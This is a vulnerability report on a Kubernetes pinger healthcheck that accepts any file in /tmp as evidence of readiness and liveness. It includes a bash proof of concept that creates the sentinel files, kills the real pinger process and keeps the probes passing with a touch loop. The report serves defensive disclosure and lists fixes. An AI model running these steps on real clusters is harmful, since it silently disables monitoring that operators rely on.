### Title
Unprivileged `/tmp` Write Access Allows Spoofing of Pinger Readiness and Liveness Probes

### Summary
The `healthcheck` binary in `pinger/cmd/healthcheck/main.go` determines pod readiness solely by checking whether `/tmp/ready` exists via `os.Stat()`, with no verification of file ownership, content integrity, or creator identity. Any process with write access to `/tmp` can pre-create or persist these sentinel files, causing Kubernetes to permanently report the pinger as healthy even when the actual pinger process has never started or has crashed, silently disabling the mirror-node monitoring function.

### Finding Description
**Exact code path:**

`pinger/cmd/healthcheck/main.go`, `main()`, lines 18–24 (readiness) and 26–39 (liveness):

```go
case "ready":
    if _, err := os.Stat("/tmp/ready"); err != nil {   // line 20 — existence only
        fmt.Fprintln(os.Stderr, "not ready")
        os.Exit(1)
    }
    os.Exit(0)

case "live":
    fi, err := os.Stat("/tmp/alive")                   // line 27 — existence only
    ...
    age := time.Since(fi.ModTime())
    if age > 2*time.Minute { ... }                     // line 35 — mtime only
```

The legitimate pinger (`pinger/main.go` line 47) writes `/tmp/ready` with mode `0o644` and `/tmp/alive` with mode `0644` (line 36). Both files are world-readable and `/tmp` is world-writable (sticky bit allows any UID to create new files). The healthcheck binary never inspects `stat.Sys().(*syscall.Stat_t).Uid` or any other ownership field.

**Root cause:** The design assumes that only the pinger process can create files in `/tmp`, but `/tmp` is world-writable by convention in Linux containers. The `os.Stat()` call returns success for any file regardless of who created it.

**Exploit flow:**
1. Attacker gains code execution in the container (e.g., via RCE in a dependency, supply-chain compromise, or `kubectl exec` with stolen credentials).
2. Attacker runs: `touch /tmp/ready`
3. Every Kubernetes readiness probe invocation (`/healthcheck ready`) now exits 0 — pod is permanently marked Ready.
4. Attacker runs a background loop: `while true; do touch /tmp/alive; sleep 60; done`
5. Every liveness probe invocation (`/healthcheck live`) now exits 0 — pod is never restarted.
6. The actual pinger process can be killed or never started; Kubernetes sees a healthy pod and takes no remediation action.

**Why existing checks fail:**

- `readOnlyRootFilesystem: true` (values.yaml line 84) makes the root overlay read-only but `/tmp` is a separate `tmpfs` mount (or an `emptyDir` volume) that remains writable — this setting does not protect `/tmp`.
- `runAsNonRoot: true` / `runAsUser: 1000` (values.yaml lines 53–54) only prevents running as root; it does not prevent a non-root attacker process (also UID ≠ 0) from writing to world-writable `/tmp`.
- `capabilities: drop: [ALL]` removes Linux capabilities but does not affect filesystem permissions on world-writable directories.

### Impact Explanation
The pinger is the active monitoring component that submits tinybar transfers to the Hedera network and verifies mirror-node propagation. Spoofing its health probes causes:
- Kubernetes never restarts a dead pinger pod → mirror-node health monitoring silently ceases.
- Operators receive no alerts about pinger failure; SLO/SLA dashboards show green.
- Any real mirror-node degradation goes undetected for the duration of the attack.

This is a griefing/availability impact on the monitoring plane with no direct economic damage to network users, consistent with the Medium severity classification.

### Likelihood Explanation
The precondition (code execution within the container with `/tmp` write access) is the primary barrier. Once that bar is cleared — via any RCE vulnerability in the pinger binary or its Go dependencies, a compromised image in the supply chain, or stolen `kubectl exec` credentials — the exploit itself is a single `touch` command requiring zero privileges. It is repeatable, persistent across probe cycles, and leaves no obvious log trace since the healthcheck binary exits 0 silently.

### Recommendation
1. **Check file ownership at probe time.** In `pinger/cmd/healthcheck/main.go`, after `os.Stat()`, cast `fi.Sys()` to `*syscall.Stat_t` and assert `Uid == uint32(os.Getuid())`. Reject the file if the UID does not match the running pinger process.
2. **Use a mode-restricted path.** Write sentinel files to a directory created by the pinger at startup with mode `0700` (e.g., `/tmp/pinger-<pid>/ready`), so only the owning UID can create files there.
3. **Alternatively, use a Unix domain socket or named pipe** owned by the pinger process; the healthcheck connects to it, eliminating the file-existence race entirely.
4. **Mount `/tmp` as a private `emptyDir`** with `medium: Memory` and ensure no other container in the pod shares it, reducing the attack surface even if ownership checks are not added.

### Proof of Concept
```bash
# Step 1: Gain shell in the pinger container (attacker precondition)
kubectl exec -it <pinger-pod> -- /bin/sh

# Step 2: Spoof readiness — one command
touch /tmp/ready

# Step 3: Verify readiness probe now passes
/healthcheck ready; echo "exit: $?"   # prints: exit: 0

# Step 4: Kill the real pinger process
kill $(pgrep pinger)

# Step 5: Keep liveness probe satisfied while pinger is dead
while true; do touch /tmp/alive; sleep 60; done &

# Step 6: Verify liveness probe passes with pinger dead
/healthcheck live; echo "exit: $?"    # prints: exit: 0

# Result: Kubernetes sees a fully healthy pod; pinger is not running;
# mirror-node monitoring is silently disabled.
```